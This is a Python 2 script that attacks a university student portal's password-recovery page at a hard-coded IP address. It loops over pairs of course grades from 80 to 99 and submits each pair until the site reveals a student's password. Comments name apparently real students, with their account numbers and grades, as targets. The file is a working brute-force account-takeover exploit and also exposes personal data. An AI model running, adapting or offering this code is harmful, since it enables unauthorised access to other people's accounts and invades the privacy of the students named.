import cookielib, urllib, urllib2
import sys
import re

entryUrl = "http://210.27.12.1:90/student/index.jsp"
pwdUrl = "http://210.27.12.1:90/getpwd.jsp"
getpwdUrl = "http://210.27.12.1:90/getPwdAction.do"


cl = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cl))
urllib2.install_opener(opener)

urllib2.urlopen(entryUrl)
urllib2.urlopen(pwdUrl)

para = {
		'studentaccount' : '',
		'identitycode' : '',
		'way' : 'coursecode',
		#'loginaccount' : '1203121619',		#李双江 91, 75, 82
		#'loginaccount' : '1103121609',		#乔科
		#'loginaccount' : '1203121618',		#陈龙刚 93 82, 90
		'loginaccount' : '1203121814',
		#'loginaccount' : '1203121813',		#聂一静 95, 84
		'courseAcode' : '0022001',		#sport
		'courseBcode' : '0922205',		#data mining
		#'courseBcode' : '0322215',		#parallel
       }

flag = False

for Ai in range(80, 100):
	for Bi in range(80, 100):
		
		para['courseAachievement'] = str(Ai)
		para['courseBachievement'] = str(Bi)
		#print para
		postData = urllib.urlencode(para)

		headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'}
		req = urllib2.Request(getpwdUrl, postData, headers = headers)
		next = urllib2.urlopen(req)
		#print next.geturl()
		content = next.read()
		contentAfter = content.decode("GBK").encode('UTF-8')
		#print contentAfter
		if(re.search(r'取回密码失败', contentAfter)):
			print 'Ai=%d,Bi=%d is wrong!'%(Ai, Bi)
		elif(re.search(r'你的密码为', contentAfter)):
			print 'Find Ai=%d,Bi=%d'%(Ai, Bi)
			flag = True
			break
	if flag:
		break

if flag:
	print 'successfully find'
else:
	print 'Fail to find'

#print next.read().decode("GBK").encode(type)